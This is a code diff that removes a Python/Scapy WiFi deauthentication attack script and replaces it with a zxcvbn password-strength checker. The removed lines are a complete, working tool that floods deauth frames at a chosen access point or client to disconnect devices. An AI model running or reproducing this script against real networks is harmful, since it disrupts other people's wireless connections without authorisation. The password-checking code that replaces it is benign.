@@ -1,56 +1,39 @@
-import sys
-import threading
-import time
-import argparse
-from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Deauth
+from zxcvbn import zxcvbn
+import pprint, getpass, sys
 
-# Function to send deauth packets to a specific client or broadcast
-def send_deauth(interface, target_bssid, client_mac=None, count=0):
-    if client_mac:
-        # Sending directed deauth
-        print(f"Sending 64 directed DeAuth (code 0x{0x0c:X}). STMAC: {client_mac} to {target_bssid}")
-        deauth_pkt = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
-        sendp(deauth_pkt, iface=interface, count=count, verbose=False)
-    else:
-        # Sending broadcast deauth
-        print(f"Sending DeAuth (code 0x{0x0c:X}) to broadcast -- BSSID {target_bssid}")
-        deauth_pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
-        sendp(deauth_pkt, iface=interface, count=count, verbose=False)
+def test_single_password():
+    password = getpass.getpass("[?] Enter your password: ")
+    result = zxcvbn(password)
+    
+    print(f"\nValue: {result['password']}")
+    print(f"Password Score: {result['score']}/4")
+    print(f"Crack Time: {result['crack_times_display']['offline_slow_hashing_1e4_per_second']}")
+    print(f"Feedback: {result['feedback']['suggestions']}")
+    # pprint.pprint(result)  # Uncomment to see the entire result if needed
 
-# Function to handle multi-threading for deauth attacks
-def attack(interface, target_bssid, client_mac, count):
+def test_multiple_passwords(password_file):
     try:
-        while True:
-            send_deauth(interface, target_bssid, client_mac, count)
-            time.sleep(0.1)  # Small delay to avoid overloading the network
-    except KeyboardInterrupt:
-        print("\nAttack stopped by user.")
-
-# Main function to parse arguments and execute attack
-def main():
-    # Set up argument parser
-    parser = argparse.ArgumentParser(description="Perform a deauthentication attack on a WiFi network.")
-    parser.add_argument("count", type=int, help="Number of deauth packets to send (0 for infinite).")
-    parser.add_argument("-a", "--ap_mac", required=True, help="Target AP MAC address (BSSID).")
-    parser.add_argument("-c", "--client_mac", help="Client MAC address (optional, send to all clients if omitted).")
-    parser.add_argument("interface", help="Network interface (e.g., wlan0).")
-    
-    # Parse the command-line arguments
-    args = parser.parse_args()
-    
-    # Start attack in a separate thread
-    print(f"Starting attack on AP {args.ap_mac} with client MAC {args.client_mac if args.client_mac else 'all clients'}...")
-    attack_thread = threading.Thread(target=attack, args=(args.interface, args.ap_mac, args.client_mac, args.count))
-    attack_thread.start()
-    
-    # Keep the main thread alive
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\nAttack stopped by user.")
-        attack_thread.join()
+        with open(password_file, 'r') as passwords:
+            for password in passwords:
+                result = zxcvbn(password.strip())  # strip newlines or extra spaces
+                
+                print('\n[+] ######################')  # for readability
+                print(f"Value: {result['password']}")
+                print(f"Password Score: {result['score']}/4")
+                print(f"Crack Time: {result['crack_times_display']['offline_slow_hashing_1e4_per_second']}")
+                print(f"Feedback: {result['feedback']['suggestions']}")
+                # pprint.pprint(result)  # Uncomment to see the entire result if needed
+           
+    except FileNotFoundError:
+        print(f"[!] Error: The file '{password_file}' was not found.")
+    except Exception as e:
+        print(f"[!] An error occurred: {e}")
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) == 2:
+        test_multiple_passwords(sys.argv[1])
+    elif len(sys.argv) == 1:
+        test_single_password()
+    else:
+        print('Usage:crackerscore <file> (for a file containing passwords) or \
+        \crackerscore (for a single password.)')
